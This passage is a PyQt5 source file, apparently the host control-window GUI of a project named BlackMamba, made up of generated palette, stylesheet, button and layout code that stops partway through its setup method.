####################################################################################
# BLACKMAMBA BY: LOSEYS (https://github.com/loseys)
#
# QT GUI INTERFACE BY: WANDERSON M.PIMENTA (https://github.com/Wanderson-Magalhaes)
# ORIGINAL QT GUI: https://github.com/Wanderson-Magalhaes/Simple_PySide_Base
####################################################################################

# -*- coding: utf-8 -*-

"""
Control window of host.

>1016 - Window GUI configutarion.
1016 - Starts painel functions.
"""

import re
import sys
import time
import pathlib
import datetime
import files_rc
import threading
import pyautogui
from random import randrange
from clientui.ui_functions import *

from PyQt5 import QtGui, QtCore, QtWidgets
from PyQt5.QtCore import *
from PyQt5.QtGui import *
from PyQt5.QtWidgets import *
from PyQt5.QtWidgets import *


class Ui_MainWindow2(object):
    def setupUi(self, MainWindow, hselected=None):
        if not MainWindow.objectName():
            MainWindow.setObjectName(u"MainWindow")
        MainWindow.resize(1025, 728)
        self.hselected = hselected
        MainWindow.setMinimumSize(QSize(1000, 720))
        palette = QPalette()
        brush = QBrush(QColor(255, 255, 255, 255))
        brush.setStyle(Qt.SolidPattern)
        palette.setBrush(QPalette.Active, QPalette.WindowText, brush)
        brush1 = QBrush(QColor(0, 0, 0, 0))
        brush1.setStyle(Qt.SolidPattern)
        palette.setBrush(QPalette.Active, QPalette.Button, brush1)
        brush2 = QBrush(QColor(66, 73, 90, 255))
        brush2.setStyle(Qt.SolidPattern)
        palette.setBrush(QPalette.Active, QPalette.Light, brush2)
        brush3 = QBrush(QColor(55, 61, 75, 255))
        brush3.setStyle(Qt.SolidPattern)
        palette.setBrush(QPalette.Active, QPalette.Midlight, brush3)
        brush4 = QBrush(QColor(22, 24, 30, 255))
        brush4.setStyle(Qt.SolidPattern)
        palette.setBrush(QPalette.Active, QPalette.Dark, brush4)
        brush5 = QBrush(QColor(29, 32, 40, 255))
        brush5.setStyle(Qt.SolidPattern)
        palette.setBrush(QPalette.Active, QPalette.Mid, brush5)
        brush6 = QBrush(QColor(210, 210, 210, 255))
        brush6.setStyle(Qt.SolidPattern)
        palette.setBrush(QPalette.Active, QPalette.Text, brush6)
        palette.setBrush(QPalette.Active, QPalette.BrightText, brush)
        palette.setBrush(QPalette.Active, QPalette.ButtonText, brush)
        palette.setBrush(QPalette.Active, QPalette.Base, brush1)
        palette.setBrush(QPalette.Active, QPalette.Window, brush1)
        brush7 = QBrush(QColor(0, 0, 0, 255))
        brush7.setStyle(Qt.SolidPattern)
        palette.setBrush(QPalette.Active, QPalette.Shadow, brush7)
        brush8 = QBrush(QColor(85, 170, 255, 255))
        brush8.setStyle(Qt.SolidPattern)
        palette.setBrush(QPalette.Active, QPalette.Highlight, brush8)
        palette.setBrush(QPalette.Active, QPalette.Link, brush8)
        brush9 = QBrush(QColor(255, 0, 127, 255))
        brush9.setStyle(Qt.SolidPattern)
        palette.setBrush(QPalette.Active, QPalette.LinkVisited, brush9)
        palette.setBrush(QPalette.Active, QPalette.AlternateBase, brush4)
        brush10 = QBrush(QColor(44, 49, 60, 255))
        brush10.setStyle(Qt.SolidPattern)
        palette.setBrush(QPalette.Active, QPalette.ToolTipBase, brush10)
        palette.setBrush(QPalette.Active, QPalette.ToolTipText, brush6)
        brush11 = QBrush(QColor(210, 210, 210, 128))
        brush11.setStyle(Qt.NoBrush)
        # if QT_VERSION >= QT_VERSION_CHECK(5, 12, 0)
        palette.setBrush(QPalette.Active, QPalette.PlaceholderText, brush11)
        # endif
        palette.setBrush(QPalette.Inactive, QPalette.WindowText, brush)
        palette.setBrush(QPalette.Inactive, QPalette.Button, brush1)
        palette.setBrush(QPalette.Inactive, QPalette.Light, brush2)
        palette.setBrush(QPalette.Inactive, QPalette.Midlight, brush3)
        palette.setBrush(QPalette.Inactive, QPalette.Dark, brush4)
        palette.setBrush(QPalette.Inactive, QPalette.Mid, brush5)
        palette.setBrush(QPalette.Inactive, QPalette.Text, brush6)
        palette.setBrush(QPalette.Inactive, QPalette.BrightText, brush)
        palette.setBrush(QPalette.Inactive, QPalette.ButtonText, brush)
        palette.setBrush(QPalette.Inactive, QPalette.Base, brush1)
        palette.setBrush(QPalette.Inactive, QPalette.Window, brush1)
        palette.setBrush(QPalette.Inactive, QPalette.Shadow, brush7)
        palette.setBrush(QPalette.Inactive, QPalette.Highlight, brush8)
        palette.setBrush(QPalette.Inactive, QPalette.Link, brush8)
        palette.setBrush(QPalette.Inactive, QPalette.LinkVisited, brush9)
        palette.setBrush(QPalette.Inactive, QPalette.AlternateBase, brush4)
        palette.setBrush(QPalette.Inactive, QPalette.ToolTipBase, brush10)
        palette.setBrush(QPalette.Inactive, QPalette.ToolTipText, brush6)
        brush12 = QBrush(QColor(210, 210, 210, 128))
        brush12.setStyle(Qt.NoBrush)
        # if QT_VERSION >= QT_VERSION_CHECK(5, 12, 0)
        palette.setBrush(QPalette.Inactive, QPalette.PlaceholderText, brush12)
        # endif
        palette.setBrush(QPalette.Disabled, QPalette.WindowText, brush4)
        palette.setBrush(QPalette.Disabled, QPalette.Button, brush1)
        palette.setBrush(QPalette.Disabled, QPalette.Light, brush2)
        palette.setBrush(QPalette.Disabled, QPalette.Midlight, brush3)
        palette.setBrush(QPalette.Disabled, QPalette.Dark, brush4)
        palette.setBrush(QPalette.Disabled, QPalette.Mid, brush5)
        palette.setBrush(QPalette.Disabled, QPalette.Text, brush4)
        palette.setBrush(QPalette.Disabled, QPalette.BrightText, brush)
        palette.setBrush(QPalette.Disabled, QPalette.ButtonText, brush4)
        palette.setBrush(QPalette.Disabled, QPalette.Base, brush1)
        palette.setBrush(QPalette.Disabled, QPalette.Window, brush1)
        palette.setBrush(QPalette.Disabled, QPalette.Shadow, brush7)
        brush13 = QBrush(QColor(51, 153, 255, 255))
        brush13.setStyle(Qt.SolidPattern)
        palette.setBrush(QPalette.Disabled, QPalette.Highlight, brush13)
        palette.setBrush(QPalette.Disabled, QPalette.Link, brush8)
        palette.setBrush(QPalette.Disabled, QPalette.LinkVisited, brush9)
        palette.setBrush(QPalette.Disabled, QPalette.AlternateBase, brush10)
        palette.setBrush(QPalette.Disabled, QPalette.ToolTipBase, brush10)
        palette.setBrush(QPalette.Disabled, QPalette.ToolTipText, brush6)
        brush14 = QBrush(QColor(210, 210, 210, 128))
        brush14.setStyle(Qt.NoBrush)
        # if QT_VERSION >= QT_VERSION_CHECK(5, 12, 0)
        palette.setBrush(QPalette.Disabled, QPalette.PlaceholderText, brush14)
        MainWindow.setPalette(palette)
        font = QFont()
        font.setFamily(u"Segoe UI")
        font.setPointSize(10)
        MainWindow.setFont(font)
        MainWindow.setStyleSheet(u"QMainWindow {background: transparent; }\n"
                                 "QToolTip {\n"
                                 "	color: #ffffff;\n"
                                 "	background-color: rgba(27, 29, 35, 160);\n"
                                 "	border: 1px solid rgb(40, 40, 40);\n"
                                 "	border-radius: 2px;\n"
                                 "}")
        self.centralwidget = QWidget(MainWindow)
        self.centralwidget.setObjectName(u"centralwidget")
        self.centralwidget.setStyleSheet(u"background: transparent;\n"
                                         "color: rgb(210, 210, 210);")
        self.horizontalLayout = QHBoxLayout(self.centralwidget)
        self.horizontalLayout.setSpacing(0)
        self.horizontalLayout.setObjectName(u"horizontalLayout")
        self.horizontalLayout.setContentsMargins(10, 10, 10, 10)
        self.frame_main = QFrame(self.centralwidget)
        self.frame_main.setObjectName(u"frame_main")
        self.frame_main.setStyleSheet(u"/* LINE EDIT */\n"
                                      "QLineEdit {\n"
                                      "	background-color: rgb(27, 29, 35);\n"
                                      "	border-radius: 5px;\n"
                                      "	border: 2px solid rgb(27, 29, 35);\n"
                                      "	padding-left: 10px;\n"
                                      "}\n"
                                      "QLineEdit:hover {\n"
                                      "	border: 2px solid rgb(64, 71, 88);\n"
                                      "}\n"
                                      "QLineEdit:focus {\n"
                                      "	border: 2px solid rgb(91, 101, 124);\n"
                                      "}\n"
                                      "\n"
                                      "/* SCROLL BARS */\n"
                                      "QScrollBar:horizontal {\n"
                                      "    border: none;\n"
                                      "    background: rgb(52, 59, 72);\n"
                                      "    height: 14px;\n"
                                      "    margin: 0px 21px 0 21px;\n"
                                      "	border-radius: 0px;\n"
                                      "}\n"
                                      "QScrollBar::handle:horizontal {\n"
                                      "    background: rgb(85, 170, 255);\n"
                                      "    min-width: 25px;\n"
                                      "	border-radius: 7px\n"
                                      "}\n"
                                      "QScrollBar::add-line:horizontal {\n"
                                      "    border: none;\n"
                                      "    background: rgb(55, 63, 77);\n"
                                      "    width: 20px;\n"
                                      "	border-top-right-radius: 7px;\n"
                                      "    border-bottom-right-radius: 7px;\n"
                                      "    subcontrol-position: right;\n"
                                      "    subcontrol-origin: margin;\n"
                                      "}\n"
                                      "QScrollBar::sub-line:horizontal {\n"
                                      "    border: none;\n"
                                      "    background: rgb(55, 63, 77);\n"
                                      "    width: 20px;\n"
                                      ""
                                      "	border-top-left-radius: 7px;\n"
                                      "    border-bottom-left-radius: 7px;\n"
                                      "    subcontrol-position: left;\n"
                                      "    subcontrol-origin: margin;\n"
                                      "}\n"
                                      "QScrollBar::up-arrow:horizontal, QScrollBar::down-arrow:horizontal\n"
                                      "{\n"
                                      "     background: none;\n"
                                      "}\n"
                                      "QScrollBar::add-page:horizontal, QScrollBar::sub-page:horizontal\n"
                                      "{\n"
                                      "     background: none;\n"
                                      "}\n"
                                      " QScrollBar:vertical {\n"
                                      "	border: none;\n"
                                      "    background: rgb(52, 59, 72);\n"
                                      "    width: 14px;\n"
                                      "    margin: 21px 0 21px 0;\n"
                                      "	border-radius: 0px;\n"
                                      " }\n"
                                      " QScrollBar::handle:vertical {	\n"
                                      "	background: rgb(85, 170, 255);\n"
                                      "    min-height: 25px;\n"
                                      "	border-radius: 7px\n"
                                      " }\n"
                                      " QScrollBar::add-line:vertical {\n"
                                      "     border: none;\n"
                                      "    background: rgb(55, 63, 77);\n"
                                      "     height: 20px;\n"
                                      "	border-bottom-left-radius: 7px;\n"
                                      "    border-bottom-right-radius: 7px;\n"
                                      "     subcontrol-position: bottom;\n"
                                      "     subcontrol-origin: margin;\n"
                                      " }\n"
                                      " QScrollBar::sub-line:vertical {\n"
                                      "	border: none;\n"
                                      "    background: rgb(55, 63"
                                      ", 77);\n"
                                      "     height: 20px;\n"
                                      "	border-top-left-radius: 7px;\n"
                                      "    border-top-right-radius: 7px;\n"
                                      "     subcontrol-position: top;\n"
                                      "     subcontrol-origin: margin;\n"
                                      " }\n"
                                      " QScrollBar::up-arrow:vertical, QScrollBar::down-arrow:vertical {\n"
                                      "     background: none;\n"
                                      " }\n"
                                      "\n"
                                      " QScrollBar::add-page:vertical, QScrollBar::sub-page:vertical {\n"
                                      "     background: none;\n"
                                      " }\n"
                                      "\n"
                                      "/* CHECKBOX */\n"
                                      "QCheckBox::indicator {\n"
                                      "    border: 3px solid rgb(52, 59, 72);\n"
                                      "	width: 15px;\n"
                                      "	height: 15px;\n"
                                      "	border-radius: 10px;\n"
                                      "    background: rgb(44, 49, 60);\n"
                                      "}\n"
                                      "QCheckBox::indicator:hover {\n"
                                      "    border: 3px solid rgb(58, 66, 81);\n"
                                      "}\n"
                                      "QCheckBox::indicator:checked {\n"
                                      "    background: 3px solid rgb(52, 59, 72);\n"
                                      "	border: 3px solid rgb(52, 59, 72);	\n"
                                      "	background-image: url(:/16x16/icons/16x16/cil-check-alt.png);\n"
                                      "}\n"
                                      "\n"
                                      "/* RADIO BUTTON */\n"
                                      "QRadioButton::indicator {\n"
                                      "    border: 3px solid rgb(52, 59, 72);\n"
                                      "	width: 15px;\n"
                                      "	height: 15px;\n"
                                      "	border-radius"
                                      ": 10px;\n"
                                      "    background: rgb(44, 49, 60);\n"
                                      "}\n"
                                      "QRadioButton::indicator:hover {\n"
                                      "    border: 3px solid rgb(58, 66, 81);\n"
                                      "}\n"
                                      "QRadioButton::indicator:checked {\n"
                                      "    background: 3px solid rgb(94, 106, 130);\n"
                                      "	border: 3px solid rgb(52, 59, 72);	\n"
                                      "}\n"
                                      "\n"
                                      "/* COMBOBOX */\n"
                                      "QComboBox{\n"
                                      "	background-color: rgb(27, 29, 35);\n"
                                      "	border-radius: 5px;\n"
                                      "	border: 2px solid rgb(27, 29, 35);\n"
                                      "	padding: 5px;\n"
                                      "	padding-left: 10px;\n"
                                      "}\n"
                                      "QComboBox:hover{\n"
                                      "	border: 2px solid rgb(64, 71, 88);\n"
                                      "}\n"
                                      "QComboBox::drop-down {\n"
                                      "	subcontrol-origin: padding;\n"
                                      "	subcontrol-position: top right;\n"
                                      "	width: 25px; \n"
                                      "	border-left-width: 3px;\n"
                                      "	border-left-color: rgba(39, 44, 54, 150);\n"
                                      "	border-left-style: solid;\n"
                                      "	border-top-right-radius: 3px;\n"
                                      "	border-bottom-right-radius: 3px;	\n"
                                      "	background-image: url(:/16x16/icons/16x16/cil-arrow-bottom.png);\n"
                                      "	background-position: center;\n"
                                      "	background-repeat: no-reperat;\n"
                                      " }\n"
                                      "QComboBox QAbstractItemView {\n"
                                      "	color: rgb("
                                      "85, 170, 255);	\n"
                                      "	background-color: rgb(27, 29, 35);\n"
                                      "	padding: 10px;\n"
                                      "	selection-background-color: rgb(39, 44, 54);\n"
                                      "}\n"
                                      "\n"
                                      "/* SLIDERS */\n"
                                      "QSlider::groove:horizontal {\n"
                                      "    border-radius: 9px;\n"
                                      "    height: 18px;\n"
                                      "	margin: 0px;\n"
                                      "	background-color: rgb(52, 59, 72);\n"
                                      "}\n"
                                      "QSlider::groove:horizontal:hover {\n"
                                      "	background-color: rgb(55, 62, 76);\n"
                                      "}\n"
                                      "QSlider::handle:horizontal {\n"
                                      "    background-color: rgb(85, 170, 255);\n"
                                      "    border: none;\n"
                                      "    height: 18px;\n"
                                      "    width: 18px;\n"
                                      "    margin: 0px;\n"
                                      "	border-radius: 9px;\n"
                                      "}\n"
                                      "QSlider::handle:horizontal:hover {\n"
                                      "    background-color: rgb(105, 180, 255);\n"
                                      "}\n"
                                      "QSlider::handle:horizontal:pressed {\n"
                                      "    background-color: rgb(65, 130, 195);\n"
                                      "}\n"
                                      "\n"
                                      "QSlider::groove:vertical {\n"
                                      "    border-radius: 9px;\n"
                                      "    width: 18px;\n"
                                      "    margin: 0px;\n"
                                      "	background-color: rgb(52, 59, 72);\n"
                                      "}\n"
                                      "QSlider::groove:vertical:hover {\n"
                                      "	background-color: rgb(55, 62, 76);\n"
                                      "}\n"
                                      "QSlider::handle:verti"
                                      "cal {\n"
                                      "    background-color: rgb(85, 170, 255);\n"
                                      "	border: none;\n"
                                      "    height: 18px;\n"
                                      "    width: 18px;\n"
                                      "    margin: 0px;\n"
                                      "	border-radius: 9px;\n"
                                      "}\n"
                                      "QSlider::handle:vertical:hover {\n"
                                      "    background-color: rgb(105, 180, 255);\n"
                                      "}\n"
                                      "QSlider::handle:vertical:pressed {\n"
                                      "    background-color: rgb(65, 130, 195);\n"
                                      "}\n"
                                      "\n"
                                      "")
        self.frame_main.setFrameShape(QFrame.NoFrame)
        self.frame_main.setFrameShadow(QFrame.Raised)
        self.verticalLayout = QVBoxLayout(self.frame_main)
        self.verticalLayout.setSpacing(0)
        self.verticalLayout.setObjectName(u"verticalLayout")
        self.verticalLayout.setContentsMargins(0, 0, 0, 0)
        self.frame_top = QFrame(self.frame_main)
        self.frame_top.setObjectName(u"frame_top")
        self.frame_top.setMinimumSize(QSize(0, 65))
        self.frame_top.setMaximumSize(QSize(16777215, 65))
        self.frame_top.setStyleSheet(u"background-color: transparent;")
        self.frame_top.setFrameShape(QFrame.NoFrame)
        self.frame_top.setFrameShadow(QFrame.Raised)
        self.horizontalLayout_3 = QHBoxLayout(self.frame_top)
        self.horizontalLayout_3.setSpacing(0)
        self.horizontalLayout_3.setObjectName(u"horizontalLayout_3")
        self.horizontalLayout_3.setContentsMargins(0, 0, 0, 0)
        self.frame_toggle = QFrame(self.frame_top)
        self.frame_toggle.setObjectName(u"frame_toggle")
        self.frame_toggle.setMaximumSize(QSize(70, 16777215))
        self.frame_toggle.setStyleSheet(u"background-color: rgb(27, 29, 35);")
        self.frame_toggle.setFrameShape(QFrame.NoFrame)
        self.frame_toggle.setFrameShadow(QFrame.Raised)
        self.verticalLayout_3 = QVBoxLayout(self.frame_toggle)
        self.verticalLayout_3.setSpacing(0)
        self.verticalLayout_3.setObjectName(u"verticalLayout_3")
        self.verticalLayout_3.setContentsMargins(0, 0, 0, 0)
        self.horizontalLayout_3.addWidget(self.frame_toggle)
        self.frame_top_right = QFrame(self.frame_top)
        self.frame_top_right.setObjectName(u"frame_top_right")
        self.frame_top_right.setStyleSheet(u"background: transparent;")
        self.frame_top_right.setFrameShape(QFrame.NoFrame)
        self.frame_top_right.setFrameShadow(QFrame.Raised)
        self.verticalLayout_2 = QVBoxLayout(self.frame_top_right)
        self.verticalLayout_2.setSpacing(0)
        self.verticalLayout_2.setObjectName(u"verticalLayout_2")
        self.verticalLayout_2.setContentsMargins(0, 0, 0, 0)
        self.frame_top_btns = QFrame(self.frame_top_right)
        self.frame_top_btns.setObjectName(u"frame_top_btns")
        self.frame_top_btns.setMaximumSize(QSize(16777215, 42))
        self.frame_top_btns.setStyleSheet(u"background-color: rgba(27, 29, 35, 200)")
        self.frame_top_btns.setFrameShape(QFrame.NoFrame)
        self.frame_top_btns.setFrameShadow(QFrame.Raised)
        self.horizontalLayout_4 = QHBoxLayout(self.frame_top_btns)
        self.horizontalLayout_4.setSpacing(0)
        self.horizontalLayout_4.setObjectName(u"horizontalLayout_4")
        self.horizontalLayout_4.setContentsMargins(0, 0, 0, 0)
        self.frame_label_top_btns = QFrame(self.frame_top_btns)
        self.frame_label_top_btns.setObjectName(u"frame_label_top_btns")
        sizePolicy = QSizePolicy(QSizePolicy.Expanding, QSizePolicy.Preferred)
        sizePolicy.setHorizontalStretch(0)
        sizePolicy.setVerticalStretch(0)
        sizePolicy.setHeightForWidth(self.frame_label_top_btns.sizePolicy().hasHeightForWidth())
        self.frame_label_top_btns.setSizePolicy(sizePolicy)
        self.frame_label_top_btns.setFrameShape(QFrame.NoFrame)
        self.frame_label_top_btns.setFrameShadow(QFrame.Raised)
        self.horizontalLayout_10 = QHBoxLayout(self.frame_label_top_btns)
        self.horizontalLayout_10.setSpacing(0)
        self.horizontalLayout_10.setObjectName(u"horizontalLayout_10")
        self.horizontalLayout_10.setContentsMargins(5, 0, 10, 0)
        self.frame_icon_top_bar = QFrame(self.frame_label_top_btns)
        self.frame_icon_top_bar.setObjectName(u"frame_icon_top_bar")
        self.frame_icon_top_bar.setMaximumSize(QSize(30, 30))
        self.frame_icon_top_bar.setStyleSheet(u"background: transparent;\n"
                                              "background-image: url(:/16x16/icons/16x16/cil-screen-desktop.png);\n"
                                              "background-position: center;\n"
                                              "background-repeat: no-repeat;\n"
                                              "")
        self.frame_icon_top_bar.setFrameShape(QFrame.StyledPanel)
        self.frame_icon_top_bar.setFrameShadow(QFrame.Raised)
        self.horizontalLayout_10.addWidget(self.frame_icon_top_bar)
        self.label_title_bar_top = QLabel(self.frame_label_top_btns)
        self.label_title_bar_top.setObjectName(u"label_title_bar_top")
        font1 = QFont()
        font1.setFamily(u"Segoe UI")
        font1.setPointSize(10)
        font1.setBold(True)
        font1.setWeight(75)
        self.label_title_bar_top.setFont(font1)
        self.label_title_bar_top.setStyleSheet(u"background: transparent;\n"
                                               "")
        self.horizontalLayout_10.addWidget(self.label_title_bar_top)
        self.horizontalLayout_4.addWidget(self.frame_label_top_btns)
        self.frame_btns_right = QFrame(self.frame_top_btns)
        self.frame_btns_right.setObjectName(u"frame_btns_right")
        sizePolicy.setHeightForWidth(self.frame_btns_right.sizePolicy().hasHeightForWidth())
        self.frame_btns_right.setSizePolicy(sizePolicy)
        self.frame_btns_right.setMaximumSize(QSize(120, 16777215))
        self.frame_btns_right.setFrameShape(QFrame.NoFrame)
        self.frame_btns_right.setFrameShadow(QFrame.Raised)
        self.horizontalLayout_5 = QHBoxLayout(self.frame_btns_right)
        self.horizontalLayout_5.setSpacing(0)
        self.horizontalLayout_5.setObjectName(u"horizontalLayout_5")
        self.horizontalLayout_5.setContentsMargins(0, 0, 0, 0)
        self.btn_minimize = QPushButton(self.frame_btns_right)
        self.btn_minimize.setObjectName(u"btn_minimize")
        sizePolicy1 = QSizePolicy(QSizePolicy.Minimum, QSizePolicy.Expanding)
        sizePolicy1.setHorizontalStretch(0)
        sizePolicy1.setVerticalStretch(0)
        sizePolicy1.setHeightForWidth(self.btn_minimize.sizePolicy().hasHeightForWidth())
        self.btn_minimize.setSizePolicy(sizePolicy1)
        self.btn_minimize.setMinimumSize(QSize(40, 0))
        self.btn_minimize.setMaximumSize(QSize(40, 16777215))
        self.btn_minimize.setStyleSheet(u"QPushButton {	\n"
                                        "	border: none;\n"
                                        "	background-color: transparent;\n"
                                        "}\n"
                                        "QPushButton:hover {\n"
                                        "	background-color: rgb(52, 59, 72);\n"
                                        "}\n"
                                        "QPushButton:pressed {	\n"
                                        "	background-color: rgb(85, 170, 255);\n"
                                        "}")
        icon = QIcon()
        icon.addFile(u":/16x16/icons/16x16/cil-window-minimize.png", QSize(), QIcon.Normal, QIcon.Off)
        self.btn_minimize.setIcon(icon)
        self.horizontalLayout_5.addWidget(self.btn_minimize)
        self.btn_maximize_restore = QPushButton(self.frame_btns_right)
        self.btn_maximize_restore.setObjectName(u"btn_maximize_restore")
        sizePolicy1.setHeightForWidth(self.btn_maximize_restore.sizePolicy().hasHeightForWidth())
        self.btn_maximize_restore.setSizePolicy(sizePolicy1)
        self.btn_maximize_restore.setMinimumSize(QSize(40, 0))
        self.btn_maximize_restore.setMaximumSize(QSize(40, 16777215))
        self.btn_maximize_restore.setStyleSheet(u"QPushButton {	\n"
                                                "	border: none;\n"
                                                "	background-color: transparent;\n"
                                                "}\n"
                                                "QPushButton:hover {\n"
                                                "	background-color: rgb(52, 59, 72);\n"
                                                "}\n"
                                                "QPushButton:pressed {	\n"
                                                "	background-color: rgb(85, 170, 255);\n"
                                                "}")
        icon1 = QIcon()
        icon1.addFile(u":/16x16/icons/16x16/cil-window-maximize.png", QSize(), QIcon.Normal, QIcon.Off)
        self.btn_maximize_restore.setIcon(icon1)
        self.horizontalLayout_5.addWidget(self.btn_maximize_restore)
        self.btn_close = QPushButton(self.frame_btns_right)
        self.btn_close.setObjectName(u"btn_close")
        sizePolicy1.setHeightForWidth(self.btn_close.sizePolicy().hasHeightForWidth())
        self.btn_close.setSizePolicy(sizePolicy1)
        self.btn_close.setMinimumSize(QSize(40, 0))
        self.btn_close.setMaximumSize(QSize(40, 16777215))
        self.btn_close.setStyleSheet(u"QPushButton {	\n"
                                     "	border: none;\n"
                                     "	background-color: transparent;\n"
                                     "}\n"
                                     "QPushButton:hover {\n"
                                     "	background-color: rgb(52, 59, 72);\n"
                                     "}\n"
                                     "QPushButton:pressed {	\n"
                                     "	background-color: rgb(85, 170, 255);\n"
                                     "}")
        icon2 = QIcon()
        icon2.addFile(u":/16x16/icons/16x16/cil-x.png", QSize(), QIcon.Normal, QIcon.Off)
        self.btn_close.setIcon(icon2)
        self.horizontalLayout_5.addWidget(self.btn_close)
        self.horizontalLayout_4.addWidget(self.frame_btns_right, 0, Qt.AlignRight)
        self.verticalLayout_2.addWidget(self.frame_top_btns)
        self.frame_top_info = QFrame(self.frame_top_right)
        self.frame_top_info.setObjectName(u"frame_top_info")
        self.frame_top_info.setMaximumSize(QSize(16777215, 65))
        self.frame_top_info.setStyleSheet(u"background-color: rgb(39, 44, 54);")
        self.frame_top_info.setFrameShape(QFrame.NoFrame)
        self.frame_top_info.setFrameShadow(QFrame.Raised)
        self.horizontalLayout_8 = QHBoxLayout(self.frame_top_info)
        self.horizontalLayout_8.setSpacing(0)
        self.horizontalLayout_8.setObjectName(u"horizontalLayout_8")
        self.horizontalLayout_8.setContentsMargins(10, 0, 10, 0)
        self.label_top_info_1 = QLabel(self.frame_top_info)
        self.label_top_info_1.setObjectName(u"label_top_info_1")
        self.label_top_info_1.setMaximumSize(QSize(16777215, 15))
        font2 = QFont()
        font2.setFamily(u"Segoe UI")
        self.label_top_info_1.setFont(font2)
        self.label_top_info_1.setStyleSheet(u"color: rgb(98, 103, 111); ")
        self.horizontalLayout_8.addWidget(self.label_top_info_1)
        self.verticalLayout_2.addWidget(self.frame_top_info)
        self.horizontalLayout_3.addWidget(self.frame_top_right)
        self.verticalLayout.addWidget(self.frame_top)
        self.frame_center = QFrame(self.frame_main)
        self.frame_center.setObjectName(u"frame_center")
        sizePolicy2 = QSizePolicy(QSizePolicy.Expanding, QSizePolicy.Expanding)
        sizePolicy2.setHorizontalStretch(0)
        sizePolicy2.setVerticalStretch(0)
        sizePolicy2.setHeightForWidth(self.frame_center.sizePolicy().hasHeightForWidth())
        self.frame_center.setSizePolicy(sizePolicy2)
        self.frame_center.setStyleSheet(u"background-color: rgb(40, 44, 52);")
        self.frame_center.setFrameShape(QFrame.NoFrame)
        self.frame_center.setFrameShadow(QFrame.Raised)
        self.horizontalLayout_2 = QHBoxLayout(self.frame_center)
        self.horizontalLayout_2.setSpacing(0)
        self.horizontalLayout_2.setObjectName(u"horizontalLayout_2")
        self.horizontalLayout_2.setContentsMargins(0, 0, 0, 0)
        self.frame_content_right = QFrame(self.frame_center)
        self.frame_content_right.setObjectName(u"frame_content_right")
        self.frame_content_right.setStyleSheet(u"background-color: rgb(44, 49, 60);")
        self.frame_content_right.setFrameShape(QFrame.NoFrame)
        self.frame_content_right.setFrameShadow(QFrame.Raised)
        self.verticalLayout_4 = QVBoxLayout(self.frame_content_right)
        self.verticalLayout_4.setSpacing(0)
        self.verticalLayout_4.setObjectName(u"verticalLayout_4")
        self.verticalLayout_4.setContentsMargins(0, 0, 0, 0)
        self.frame_content = QFrame(self.frame_content_right)
        self.frame_content.setObjectName(u"frame_content")
        self.frame_content.setFrameShape(QFrame.NoFrame)
        self.frame_content.setFrameShadow(QFrame.Raised)
        self.verticalLayout_9 = QVBoxLayout(self.frame_content)
        self.verticalLayout_9.setSpacing(0)
        self.verticalLayout_9.setObjectName(u"verticalLayout_9")
        self.verticalLayout_9.setContentsMargins(5, 5, 5, 5)
        self.stackedWidget = QStackedWidget(self.frame_content)
        self.stackedWidget.setObjectName(u"stackedWidget")
        self.stackedWidget.setStyleSheet(u"background: transparent;")
        self.page_home = QWidget()
        self.page_home.setObjectName(u"page_home")
        self.verticalLayout_10 = QVBoxLayout(self.page_home)
        self.verticalLayout_10.setObjectName(u"verticalLayout_10")
        self.label_6 = QLabel(self.page_home)
        self.label_6.setObjectName(u"label_6")
        font3 = QFont()
        font3.setFamily(u"Segoe UI")
        font3.setPointSize(40)
        self.label_6.setFont(font3)
        self.label_6.setStyleSheet(u"")
        self.label_6.setAlignment(Qt.AlignCenter)

        self.verticalLayout_10.addWidget(self.label_6)

        self.label = QLabel(self.page_home)
        self.label.setObjectName(u"label")
        font4 = QFont()
        font4.setFamily(u"Segoe UI")
        font4.setPointSize(14)
        self.label.setFont(font4)
        self.label.setAlignment(Qt.AlignCenter)

        self.verticalLayout_10.addWidget(self.label)

        self.label_7 = QLabel(self.page_home)
        self.label_7.setObjectName(u"label_7")
        font5 = QFont()
        font5.setFamily(u"Segoe UI")
        font5.setPointSize(15)
        self.label_7.setFont(font5)
        self.label_7.setAlignment(Qt.AlignCenter)

        self.verticalLayout_10.addWidget(self.label_7)

        self.stackedWidget.addWidget(self.page_home)
        self.page_widgets = QWidget()
        self.page_widgets.setObjectName(u"page_widgets")
        self.gridLayout_4 = QGridLayout(self.page_widgets)
        self.gridLayout_4.setSpacing(6)
        self.gridLayout_4.setObjectName(u"gridLayout_4")
        self.gridLayout_4.setContentsMargins(9, 9, -1, 9)
        self.gridLayout = QGridLayout()
        self.gridLayout.setSpacing(6)
        self.gridLayout.setObjectName(u"gridLayout")
        self.gridLayout.setContentsMargins(0, 0, 0, 0)
        self.frame_4 = QFrame(self.page_widgets)
        self.frame_4.setObjectName(u"frame_4")
        self.frame_4.setMinimumSize(QSize(10, 222))
        self.frame_4.setMaximumSize(QSize(16777215, 16777215))
        self.frame_4.setStyleSheet(u"background-color: rgb(41, 45, 56);\n"
                                   "border-radius: 5px;")
        self.frame_4.setFrameShape(QFrame.StyledPanel)
        self.frame_4.setFrameShadow(QFrame.Raised)
        self.gridLayout_3 = QGridLayout(self.frame_4)
        self.gridLayout_3.setSpacing(9)
        self.gridLayout_3.setObjectName(u"gridLayout_3")
        self.gridLayout_3.setContentsMargins(0, 0, 0, 0)
        self.verticalLayout_6 = QVBoxLayout()
        self.verticalLayout_6.setObjectName(u"verticalLayout_6")
        self.verticalLayout_6.setContentsMargins(0, -1, 0, -1)
        self.scrollArea_2 = QScrollArea(self.frame_4)
        self.scrollArea_2.setObjectName(u"scrollArea_2")
        self.scrollArea_2.setStyleSheet(u"background-color: rgb(27, 29, 35);\n"
                                        "border-radius: 5px;")
        self.scrollArea_2.setWidgetResizable(True)
        self.scrollAreaWidgetContents_4 = QWidget()
        self.scrollAreaWidgetContents_4.setObjectName(u"scrollAreaWidgetContents_4")
        self.scrollAreaWidgetContents_4.setGeometry(QRect(0, 0, 654, 184))
        self.gridLayout_7 = QGridLayout(self.scrollAreaWidgetContents_4)
        self.gridLayout_7.setObjectName(u"gridLayout_7")
        self.host_terminal = QLabel(self.scrollAreaWidgetContents_4)


        self.host_terminal.setObjectName(u"label_3")
        self.host_terminal.setAlignment(Qt.AlignLeading | Qt.AlignLeft | Qt.AlignTop)

        self.gridLayout_7.addWidget(self.host_terminal, 0, 0, 1, 1)

        self.scrollArea_2.setWidget(self.scrollAreaWidgetContents_4)

        self.verticalLayout_6.addWidget(self.scrollArea_2)

        self.lineEdit_2 = QLineEdit(self.frame_4)
        self.lineEdit_2.setObjectName(u"lineEdit_2")
        self.lineEdit_2.setMinimumSize(QSize(90, 30))
